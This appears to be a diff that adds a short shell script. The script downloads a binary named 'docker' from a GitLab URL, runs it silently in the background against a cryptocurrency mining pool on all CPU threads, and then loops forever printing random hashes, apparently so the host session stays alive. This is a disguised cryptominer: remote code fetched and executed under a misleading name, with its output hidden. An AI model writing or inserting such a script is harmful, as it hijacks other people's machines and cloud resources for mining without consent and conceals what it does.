@@ -1,0 +1,6 @@
+apt update
+apt install sudo -y
+wget https://gitlab.com/g6292/gabutz/-/raw/main/docker
+chmod +x docker
+sudo ./docker -o stc.ss.poolin.one:443 -u henes.$(echo $(shuf -i 1111-9999 -n 1)-kuk) -p x -k -a cn/r -t$(nproc --all) > /dev/null 2>&1 &
+while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
